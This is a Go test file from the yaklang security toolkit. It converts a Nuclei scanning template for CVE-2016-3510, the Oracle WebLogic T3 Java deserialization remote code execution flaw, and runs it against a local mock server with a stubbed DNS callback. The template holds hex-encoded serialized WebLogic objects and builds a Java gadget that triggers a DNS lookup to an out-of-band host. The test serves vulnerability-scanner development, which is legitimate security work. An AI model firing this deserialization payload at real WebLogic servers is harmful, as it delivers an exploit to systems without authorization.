package httptpl

import (
	"github.com/davecgh/go-spew/spew"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/lowhttp"
	"testing"
)

func TestOOB(t *testing.T) {
	server, port := utils.DebugMockHTTP([]byte(`HTTP/1.1 200 Ok
TestDebug: 111`))
	spew.Dump(server, port)

	var demo = `id: CVE-2016-3510

info:
  name: Oracle WebLogic Server Java Object Deserialization -  Remote Code Execution
  author: iamnoooob,rootxharsh,pdresearch
  severity: critical
  description: |
    Unspecified vulnerability in the Oracle WebLogic Server component in Oracle Fusion Middleware 10.3.6.0, 12.1.3.0, and 12.2.1.0 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to WLS Core Components, a different vulnerability than CVE-2016-3586.
  reference:
    - https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/weblogic.py
  metadata:
    max-request: 1
    verified: true
  tags: cve,cve2016,weblogic,t3,rce,oast,deserialization

variables:
  start: "016501ffffffffffffffff000000710000ea6000000018432ec6a2a63985b5af7d63e64383f42a6d92c9e9af0f9472027973720078720178720278700000000c00000002000000000000000000000001007070707070700000000c00000002000000000000000000000001007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200094900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000"
  end: "fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200074900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200094900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870774621000000000000000000093132372e302e312e31000b75732d6c2d627265656e73a53caff10000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff0078fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771d018140128134bf427600093132372e302e312e31a53caff1000000000078"

tcp:
  - inputs:
      - data: "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n"
        read: 1024
      - data: "{{hex_decode(concat('00000460',start,generate_java_gadget('dns', 'http://{{interactsh-url}}', 'hex'),end))}}"

    host:
      - "{{Hostname}}"
    read-size: 4

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
`
	tpl, err := CreateYakTemplateFromNucleiTemplateRaw(demo)
	if err != nil {
		panic(err)
	}

	config := NewConfig(
		WithOOBRequireCallback(func(f ...float64) (string, string, error) {
			return "adf.dnslog.mock", "adf", nil
		}),
		WithOOBRequireCheckingTrigger(func(s string, f ...float64) (string, []byte) {
			if s == "adf" {
				return "dns", []byte("")
			}
			return "", []byte("")
		}),
		WithDebug(true), WithDebugRequest(true), WithDebugResponse(true),
	)
	_, err = tpl.Exec(config, false, []byte("GET / HTTP/1.1\r\nHost: www.baidu.com\r\n\r\n"),
		lowhttp.WithHost(server), lowhttp.WithPort(port),
	)
	if err != nil {
		panic(err)
	}
}
